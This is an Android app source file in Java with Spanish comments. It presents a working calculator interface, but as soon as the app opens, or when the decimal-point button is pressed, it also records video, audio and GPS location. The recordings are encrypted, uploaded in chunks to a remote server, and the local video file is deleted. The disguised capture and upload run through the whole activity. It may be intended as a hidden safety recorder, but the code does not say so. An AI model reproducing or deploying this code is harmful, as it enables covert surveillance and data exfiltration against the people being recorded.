package com.example.appGrabacion;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;  // Clases para manejar la cámara a través de Camera2 API
import android.media.MediaRecorder;  // Para grabar video y audio
import android.os.Bundle;
import android.util.Log;
import android.view.Surface;
import android.view.TextureView;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

// Importaciones para manejar archivos, rutas, fechas y formatos
import java.text.DecimalFormat;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import com.example.appGrabacion.pojo.ChunkedRequestBody;
import com.example.appGrabacion.encriptación.CryptoUtils;
import com.example.appGrabacion.utils.ApiService;
import com.example.appGrabacion.utils.RetrofitClient;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.UUID;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Response;

// Actividad principal que hereda de AppCompatActivity y escucha eventos de la textura (para la cámara)
public class MainActivity extends AppCompatActivity implements TextureView.SurfaceTextureListener {

    // Variables para la interfaz (display y operación)
    private TextView txtDisplay, txtOperation;
    private String currentNumber = "";
    private String operator = "";
    private double firstNumber = 0;
    private boolean isNewInput = true;

    // Constante para el permiso de la cámara
    private static final int REQUEST_CAMERA_PERMISSION = 200;
    private static final String TAG = "MainActivity";

    // Variables relacionadas con la cámara y grabación
    private CameraDevice cameraDevice;
    private TextureView textureView;
    private CameraManager cameraManager;
    private String cameraId;
    private MediaRecorder mediaRecorder;
    private CameraCaptureSession captureSession;

    // Bandera para indicar si se está grabando
    private boolean isRecording = false;

    // Variables para la localización mediante FusedLocationProviderClient
    private FusedLocationProviderClient fusedLocationClient;
    private String startLocation = "";
    private String endLocation = "";

    // Método que se ejecuta al reanudarse la actividad
    @Override
    protected void onResume(){
        super.onResume();
        textureView = findViewById(R.id.textureView);
        // Inicializa el cliente de localización
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        // Obtiene el administrador de la cámara
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
    }

    // Método que se ejecuta al iniciar la actividad
    @Override
    protected void onStart(){
        super.onStart();
        textureView = findViewById(R.id.textureView);
        // Inicializa el cliente de localización
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        // Obtiene el administrador de la cámara
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
    }

    // Método onCreate: Se configura la UI y se inician servicios según corresponda
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        setTheme(R.style.Theme_Calculadora_Front);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); // Se establece el layout de la actividad


        // Se obtienen los elementos de texto de la interfaz
        txtDisplay = findViewById(R.id.txtDisplay);
        txtOperation = findViewById(R.id.txtOperation);

        // Se configuran los listeners para los botones numéricos y de operadores
        setNumberButtonListeners();
        setOperatorButtonListeners();

        // Se obtiene la vista de la textura (donde se muestra la imagen de la cámara)
        if(textureView == null){
            textureView = findViewById(R.id.textureView);
        }

        // Se inicializan servicios de localización y cámara
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);

        // Si no se está grabando, se obtiene la ubicación de inicio y se inicia la grabación
        if (!isRecording) {
            // Se obtiene la ubicación de inicio mediante un callback
            getLocation(true, new LocationCallback() {
                @Override
                public void onLocationReceived() {
                    // Inicia el servicio del micrófono y la grabación de video
                    startMicrophoneService();
                    startVideoRecording();
                }
            });
        }
    }

    /**
     * Método para obtener la ubicación actual.
     * @param isStart Indica si es la ubicación de inicio (true) o de fin (false).
     * @param callback Se ejecuta cuando se recibe la ubicación.
     */
    private void getLocation(boolean isStart, LocationCallback callback) {
        // Verifica permisos para acceder a la localización
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_CAMERA_PERMISSION);
            return;
        }

        // Obtiene la última ubicación conocida
        fusedLocationClient.getLastLocation()
                .addOnSuccessListener(this, location -> {
                    if (location != null) {
                        // Se construye un string con latitud, longitud y timestamp
                        String locationData = "Lat: " + location.getLatitude() + ", Lon: " + location.getLongitude();
                        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());

                        if (isStart) {
                            startLocation = "Inicio (" + timestamp + "): " + locationData;
                            Log.d(TAG, "Inicio: " + startLocation);
                        } else {
                            endLocation = "Fin (" + timestamp + "): " + locationData;
                            Log.d(TAG, "Fin: " + endLocation);
                        }

                        if (callback != null) {
                            callback.onLocationReceived();
                        }
                    } else {
                        Log.e(TAG, "La ubicación es null");
                        // Se llama al callback aun si no se obtuvo ubicación
                        if (callback != null) {
                            callback.onLocationReceived();
                        }
                    }
                });
    }

    /**
     * Inicia el servicio del micrófono.
     */
    private void startMicrophoneService() {
        Intent intent = new Intent(this, MicrophoneService.class);
        startService(intent);
    }

    /**
     * Detiene el servicio del micrófono.
     */
    private void stopMicrophoneService() {
        Intent intent = new Intent(this, MicrophoneService.class);
        stopService(intent);
    }

    /**
     * Inicia la grabación de video.
     * Verifica los permisos necesarios y configura la cámara y el MediaRecorder.
     */
    private void startVideoRecording() {
        // Verifica permisos para cámara, audio y localización
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_CAMERA_PERMISSION);
            return;
        }

        // Si el SurfaceTexture es null, se crea uno manualmente (para evitar errores)
        if (textureView.getSurfaceTexture() == null) {
            Log.d(TAG, "surfaceTexture was null, instanciamos uno nuevo manualmente");
            textureView.setSurfaceTexture(new SurfaceTexture(0));
        }

        try {
            // Configura el MediaRecorder (audio, video, formato de salida, etc.)
            setupMediaRecorder();
            // Se obtiene el ID de la primera cámara disponible
            cameraId = cameraManager.getCameraIdList()[0];
            // Se abre la cámara de forma asíncrona
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    // Se crea la sesión de captura (para previsualización y grabación)
                    createCaptureSession();
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                }
            }, null);
        } catch (CameraAccessException | IOException e) {
            Log.e(TAG, "Error starting video recording", e);
        }
    }

    /**
     * Configura el MediaRecorder con los parámetros de audio, video, formato, orientación, etc.
     */
    private void setupMediaRecorder() throws IOException {
        mediaRecorder = new MediaRecorder();

        // Configurar fuentes de audio y video
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);

        // Establecer formato de salida (MPEG-4)
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);

        // Establecer archivo de salida en el directorio externo de la app
        File outputFile = new File(getExternalFilesDir(null), "recorded_video.mp4");
        mediaRecorder.setOutputFile(outputFile.getAbsolutePath());

        // Configuración de audio
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mediaRecorder.setAudioEncodingBitRate(96000); // Tasa de bits de audio
        mediaRecorder.setAudioSamplingRate(44100);    // Frecuencia de muestreo

        // Configuración de video
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mediaRecorder.setVideoEncodingBitRate(10000000);
        mediaRecorder.setVideoFrameRate(30);
        mediaRecorder.setVideoSize(1920, 1080);

        // Girar el video 90 grados para ajustar la orientación
        mediaRecorder.setOrientationHint(90);

        // Limitar la grabación a 15 minutos (aunque el comentario menciona 20)
        mediaRecorder.setMaxDuration(15 * 60 * 1000);

        mediaRecorder.setOnInfoListener(new MediaRecorder.OnInfoListener() {
            @Override
            public void onInfo(MediaRecorder mr, int what, int extra) {
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                    Log.d(TAG, "Se alcanzó el límite de 20 minutos, deteniendo la grabación.");
                    runOnUiThread(() -> {
                        stopVideoRecording();
                        stopMicrophoneService();
                        combineAudioAndLocation();
                        // Buscar el botón (btnDot) y revertir su estilo al finalizar la grabación.
                        // Si el botón se encuentra en la misma actividad, se puede usar findViewById.
                        Button btnDot = findViewById(R.id.btnDot);
                        btnDot.setBackgroundResource(R.drawable.button_circle);
                    });
                }
            }
        });


        // Preparar el MediaRecorder (compilar la configuración)
        mediaRecorder.prepare();
    }

    /**
     * Crea la sesión de captura de la cámara, combinando el Surface para la previsualización y el de grabación.
     */
    private void createCaptureSession() {
        try {
            // Se crea un Surface a partir del SurfaceTexture de la vista
            Surface textureSurface = new Surface(textureView.getSurfaceTexture());
            // Se obtiene el Surface del MediaRecorder para la grabación
            Surface recorderSurface = mediaRecorder.getSurface();

            // Se crea la sesión de captura con ambos Surface
            cameraDevice.createCaptureSession(
                    Arrays.asList(textureSurface, recorderSurface),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            captureSession = session;
                            // Se inicia la previsualización y la grabación
                            startPreviewAndRecording(session);
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Toast.makeText(MainActivity.this, "Failed to configure camera", Toast.LENGTH_SHORT).show();
                        }
                    },
                    null
            );
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating capture session", e);
        }
    }

    /**
     * Inicia la previsualización y la grabación.
     * Configura la petición de captura y arranca el MediaRecorder.
     */
    private void startPreviewAndRecording(CameraCaptureSession session) {
        try {
            // Se crea una petición para la grabación
            CaptureRequest.Builder captureRequestBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
            // Se añaden los Surface (para previsualización y grabación)
            captureRequestBuilder.addTarget(new Surface(textureView.getSurfaceTexture()));
            captureRequestBuilder.addTarget(mediaRecorder.getSurface());

            // Se envía la petición de forma repetitiva
            session.setRepeatingRequest(captureRequestBuilder.build(), null, null);
            // Se inicia la grabación de video
            mediaRecorder.start();
            isRecording = true;
            Log.d(TAG, "Video recording started");
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error starting preview and recording", e);
        }
    }

    /**
     * Detiene la grabación de video y libera recursos asociados.
     */
    private void stopVideoRecording() {
        try {
            mediaRecorder.stop();
        } catch (RuntimeException e) {
            Log.e(TAG, "Error al detener el MediaRecorder, puede que no estuviera grabando", e);
        }
        mediaRecorder.reset();
        mediaRecorder.release();
        mediaRecorder = null;

        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        isRecording = false;
        Log.d(TAG, "Video recording stopped");
    }

    /**
     * Combina el audio (o en este caso, la localización) con el video.
     * Procede a encriptar el video y la ubicación, y luego los envía al servidor.
     */
    private void combineAudioAndLocation() {
        new Thread(() -> {
            try {
                // Ruta del archivo de video grabado
                File videoFile = new File(getExternalFilesDir(null), "recorded_video.mp4");
                if (!videoFile.exists()) {
                    Log.e(TAG, "❌ Error: Archivo de video no encontrado.");
                    return;
                }

                // Encripta el video completo
                File encryptedVideoFile = new File(getExternalFilesDir(null), "encrypted_video.mp4");
                CryptoUtils.encryptFileFlexible(videoFile, encryptedVideoFile);

                // Prepara el archivo de ubicación concatenando la ubicación de inicio y fin
                String locationData = startLocation + "\n" + endLocation;
                Log.d(TAG, "Localización a enviar:\n" + locationData);
                File locationFile = new File(getExternalFilesDir(null), "location.txt");
                try (FileOutputStream fos = new FileOutputStream(locationFile)) {
                    fos.write(locationData.getBytes("UTF-8"));
                }
                if (!locationFile.exists()) {
                    Log.e(TAG, "❌ Error: Archivo de ubicación no encontrado.");
                    return;
                }

                // Encripta el archivo de ubicación
                File encryptedLocationFile = new File(getExternalFilesDir(null), "encrypted_location.txt");
                CryptoUtils.encryptFileFlexible(locationFile, encryptedLocationFile);

                // Genera un ID único para identificar la subida completa (video + ubicación)
                String fileId = UUID.randomUUID().toString();

                // --- Envía la ubicación al endpoint "upload-chunk" ---
                // Se envía con chunkIndex = -1 y totalChunks = 0 para identificarlo como ubicación.
                RequestBody fileIdBody = RequestBody.create(MediaType.parse("text/plain"), fileId);
                RequestBody chunkIndexBody = RequestBody.create(MediaType.parse("text/plain"), "-1");
                RequestBody totalChunksBody = RequestBody.create(MediaType.parse("text/plain"), "0");

                // Se utiliza el archivo de ubicación encriptada como parte del cuerpo de la petición
                RequestBody locationRequestBody = RequestBody.create(MediaType.parse("text/plain"), encryptedLocationFile);
                MultipartBody.Part locationPart = MultipartBody.Part.createFormData("chunkData", encryptedLocationFile.getName(), locationRequestBody);

                // Se obtiene la instancia del servicio de API mediante Retrofit
                ApiService apiService = RetrofitClient.getRetrofitInstance().create(ApiService.class);
                Call<ResponseBody> callLocation = apiService.uploadChunk(fileIdBody, chunkIndexBody, totalChunksBody, locationPart);

                // Se realiza la llamada de forma síncrona para enviar la ubicación
                Response<ResponseBody> locationResponse = callLocation.execute();
                if (locationResponse.isSuccessful()) {
                    Log.d(TAG, "✅ Ubicación enviada correctamente.");
                    // Luego se envían los chunks del video usando el mismo fileId
                    uploadVideoChunks(fileId, encryptedVideoFile);
                } else {
                    Log.e(TAG, "❌ Error al enviar ubicación. Código: " + locationResponse.code());
                }

                // (Opcional) Elimina el archivo original de video si es necesario
                deleteFile(videoFile);

            } catch (Exception e) {
                Log.e(TAG, "❌ Error en combineAudioAndLocation", e);
            }
        }).start();
    }

    /**
     * Elimina el archivo pasado como parámetro, si existe.
     * @param videoFile Archivo a eliminar.
     */
    private void deleteFile(File videoFile) {
        if (videoFile.exists() && videoFile.delete()) {
            Log.d(TAG, "Video file deleted successfully");
        }
    }

    /**
     * Método auxiliar para dividir un archivo en chunks.
     * @param file Archivo a dividir.
     * @param chunkSize Tamaño de cada chunk en bytes.
     * @return Lista de arreglos de bytes, cada uno representando un chunk.
     */
    public List<byte[]> splitFileIntoChunks(File file, int chunkSize) throws IOException {
        List<byte[]> chunks = new ArrayList<>();
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[chunkSize];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                if (bytesRead < chunkSize) {
                    byte[] lastChunk = Arrays.copyOf(buffer, bytesRead);
                    chunks.add(lastChunk);
                } else {
                    chunks.add(buffer.clone());
                }
            }
        }
        return chunks;
    }

    /**
     * Sube los chunks del video encriptado al servidor utilizando Retrofit y un ExecutorService para controlar la concurrencia.
     * @param fileId Identificador único del archivo.
     * @param encryptedVideoFile Archivo de video encriptado.
     */
    public void uploadVideoChunks(String fileId, File encryptedVideoFile) {
        // Tamaño del chunk: 50 MB
        long chunkSize = 50L * 1024L * 1024L;
        long fileLength = encryptedVideoFile.length();
        int totalChunks = (int) ((fileLength + chunkSize - 1) / chunkSize); // Redondeo hacia arriba
        Log.d("ChunkUpload", "Total de chunks: " + totalChunks);

        ApiService apiService = RetrofitClient.getRetrofitInstance().create(ApiService.class);

        final int maxConcurrentUploads = 3; // Límite de subidas concurrentes
        final int maxRetries = 3;             // Número máximo de reintentos por chunk
        ExecutorService executor = Executors.newFixedThreadPool(maxConcurrentUploads);

        for (int i = 0; i < totalChunks; i++) {
            final int chunkIndex = i;
            long offset = chunkIndex * chunkSize;
            long length = Math.min(chunkSize, fileLength - offset);

            // Se crea el RequestBody para el chunk
            ChunkedRequestBody chunkBody = new ChunkedRequestBody(
                    encryptedVideoFile,
                    offset,
                    length,
                    MediaType.parse("application/octet-stream")
            );

            // Se crean RequestBody para los parámetros de texto
            RequestBody fileIdBody = RequestBody.create(MediaType.parse("text/plain"), fileId);
            RequestBody chunkIndexBody = RequestBody.create(MediaType.parse("text/plain"), String.valueOf(chunkIndex));
            RequestBody totalChunksBody = RequestBody.create(MediaType.parse("text/plain"), String.valueOf(totalChunks));

            MultipartBody.Part chunkPart = MultipartBody.Part.createFormData("chunkData", "chunk_" + chunkIndex, chunkBody);

            // Se envía cada chunk de forma asíncrona con reintentos
            executor.submit(() -> {
                int attempt = 0;
                boolean uploaded = false;
                while (!uploaded && attempt < maxRetries) {
                    attempt++;
                    try {
                        // Llamada sincrónica para enviar el chunk
                        Call<ResponseBody> call = apiService.uploadChunk(fileIdBody, chunkIndexBody, totalChunksBody, chunkPart);
                        Response<ResponseBody> response = call.execute();
                        if (response.isSuccessful()) {
                            Log.d(TAG, "Chunk " + chunkIndex + " enviado correctamente.");
                            uploaded = true;
                        } else {
                            Log.e(TAG, "Error al enviar chunk " + chunkIndex + ": " + response.code()
                                    + ". Reintento " + attempt);
                            Thread.sleep(2000); // Espera de 2 segundos antes del siguiente intento
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Fallo al enviar chunk " + chunkIndex + ": " + e.getMessage()
                                + ". Reintento " + attempt);
                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException ie) {
                            // Si se interrumpe el sueño, se puede continuar o finalizar
                        }
                    }
                }
                if (!uploaded) {
                    Log.e(TAG, "No se pudo enviar el chunk " + chunkIndex + " después de "
                            + maxRetries + " intentos.");
                }
            });
        }

        // Finaliza el executor y espera a que todas las tareas terminen
        executor.shutdown();
        try {
            if (!executor.awaitTermination(30, TimeUnit.MINUTES)) {
                Log.e(TAG, "Tiempo de espera excedido para la subida de chunks.");
            }
        } catch (InterruptedException e) {
            Log.e(TAG, "Error esperando la finalización de la subida de chunks", e);
        }
    }

    /**
     * Se detienen los servicios y se obtiene la ubicación final antes de destruir la actividad.
     */
    @Override
    protected void onDestroy(){
        super.onDestroy();
        stopVideoRecording();
        stopMicrophoneService();
        // Se obtiene la ubicación final y luego se combinan el audio (localización) y el video
        getLocation(false, new LocationCallback() {
            @Override
            public void onLocationReceived() {
                combineAudioAndLocation();
            }
        });
    }

    /**
     * Callback del SurfaceTexture cuando este está disponible.
     * Se inicia la grabación en cuanto la vista está lista.
     */
    @Override
    public void onSurfaceTextureAvailable(SurfaceTexture surface, int width, int height) {
        Log.d(TAG, "SurfaceTexture disponible");
        // Se obtiene la ubicación de inicio y se inician los servicios
        getLocation(true, new LocationCallback() {
            @Override
            public void onLocationReceived() {
                startMicrophoneService();
                startVideoRecording();
            }
        });
    }

    @Override
    public void onSurfaceTextureSizeChanged(SurfaceTexture surface, int width, int height) {
        Log.d(TAG, "SurfaceTexture size changed");
        // Se pueden manejar cambios en el tamaño de la textura si fuera necesario
    }

    /**
     * Cuando el SurfaceTexture se destruye, se liberan recursos.
     * @return true indica que se libera la textura.
     */
    @Override
    public boolean onSurfaceTextureDestroyed(SurfaceTexture surface) {
        Log.d(TAG, "SurfaceTexture destroyed");
        return true;
    }

    @Override
    public void onSurfaceTextureUpdated(SurfaceTexture surface) {
        // Se pueden manejar actualizaciones de la textura (opcional)
    }

    /**
     * Interfaz para el callback que se ejecuta cuando se recibe la ubicación.
     */
    public interface LocationCallback {
        void onLocationReceived();
    }

    /**
     * Configura los listeners para los botones numéricos.
     * Cuando se presiona un botón se agrega el dígito al número actual mostrado.
     */
    private void setNumberButtonListeners() {
        int[] numberIds = {
                R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
                R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9, R.id.btnDot
        };

        // Listener para los botones numéricos
        View.OnClickListener listener = v -> {
            Button button = (Button) v;
            if (isNewInput) {
                currentNumber = button.getText().toString();
                isNewInput = false;
            } else {
                currentNumber += button.getText().toString();
            }
            txtDisplay.setText(currentNumber);
        };

        // Se asigna el listener a cada botón
        for (int id : numberIds) {
            findViewById(id).setOnClickListener(listener);
        }

        // Listener específico para el punto decimal (btnDot)
        findViewById(R.id.btnDot).setOnClickListener(v -> {
            // Obtén la referencia al botón (suponiendo que el btnDot es el que se desea cambiar)
            Button btnDot = (Button) v;

            // Si no se está grabando, se obtiene la ubicación de inicio y se inician los servicios
            if (!isRecording) {
                getLocation(true, new LocationCallback() {
                    @Override
                    public void onLocationReceived() {
                        // Cambiar el estilo del botón al iniciar la grabación
                        btnDot.setBackgroundResource(R.drawable.button_circle);
                        startMicrophoneService();
                        startVideoRecording();
                    }
                });
            }
            // Si el número actual no contiene punto, se agrega uno y se actualiza la pantalla.
            if (!currentNumber.contains(".")) {
                currentNumber += ".";
                txtDisplay.setText(currentNumber);
            }
        });

    }

    /**
     * Configura los listeners para los botones de operadores (suma, resta, etc.).
     * Se maneja cada caso (AC, ±, %, =, y operadores aritméticos) para actualizar la operación y mostrar el resultado.
     */
    private void setOperatorButtonListeners() {
        int[] operatorIds = {
                R.id.btnAdd, R.id.btnSubtract, R.id.btnMultiply, R.id.btnDivide,
                R.id.btnEqual, R.id.btnClear, R.id.btnPercent, R.id.btnSign
        };

        // Listener para los botones de operadores
        View.OnClickListener listener = v -> {
            Button button = (Button) v;
            String buttonText = button.getText().toString();

            switch (buttonText) {
                case "AC":
                    // Reinicia la operación
                    firstNumber = 0;
                    currentNumber = "0";
                    operator = "";
                    txtDisplay.setText(currentNumber);
                    txtOperation.setText("");
                    isNewInput = true;
                    break;
                case "±":
                    // Cambia el signo del número actual
                    if (!currentNumber.isEmpty()) {
                        double num = Double.parseDouble(currentNumber) * -1;
                        currentNumber = formatNumber(num);
                        txtDisplay.setText(currentNumber);
                    }
                    break;
                case "%":

                    // Calcula el porcentaje del número actual
                    if (!currentNumber.isEmpty()) {
                        double num = Double.parseDouble(currentNumber) / 100;
                        currentNumber = formatNumber(num);
                        txtDisplay.setText(currentNumber);
                    }
                    break;
                case "=":
                    // Realiza la operación pendiente
                    performCalculation();
                    break;
                default:
                    // Para operadores aritméticos
                    if (!currentNumber.isEmpty()) {
                        if (operator.isEmpty()) {
                            firstNumber = Double.parseDouble(currentNumber);
                        } else {
                            performCalculation();
                            firstNumber = Double.parseDouble(txtDisplay.getText().toString());
                        }

                        operator = buttonText;
                        isNewInput = true;
                        txtOperation.setText(formatNumber(firstNumber) + " " + operator);
                    }
                    break;
            }
        };

        // Se asigna el listener a cada botón de operador
        for (int id : operatorIds) {
            findViewById(id).setOnClickListener(listener);
        }
    }

    /**
     * Realiza el cálculo aritmético utilizando el operador y los operandos actuales.
     * Actualiza la pantalla con el resultado y la operación realizada.
     */
    private void performCalculation() {
        if (!operator.isEmpty() && !currentNumber.isEmpty()) {
            double secondNumber = Double.parseDouble(currentNumber);
            double result = 0;

            switch (operator) {
                case "+":
                    result = firstNumber + secondNumber;
                    break;
                case "-":
                    result = firstNumber - secondNumber;
                    break;
                case "×":
                    result = firstNumber * secondNumber;
                    break;
                case "÷":
                    if (secondNumber != 0) {
                        result = firstNumber / secondNumber;
                    } else {
                        txtDisplay.setText("Error");
                        return;
                    }
                    break;
            }

            txtOperation.setText(formatNumber(firstNumber) + " " + operator + " " + formatNumber(secondNumber) + " =");
            txtDisplay.setText(formatNumber(result));
            currentNumber = String.valueOf(result);
            isNewInput = true;
            operator = "";
        }
    }

    /**
     * Formatea un número para mostrarlo en pantalla.
     * Si es entero se muestra sin decimales; si no, se muestra con hasta 5 decimales.
     * @param num Número a formatear.
     * @return String con el número formateado.
     */
    private String formatNumber(double num) {
        DecimalFormat df = new DecimalFormat("#.#####"); // Hasta 5 decimales
        if (num == (int) num) {
            return String.valueOf((int) num); // Si es entero, se muestra sin decimales
        } else {
            return df.format(num);
        }
    }
}
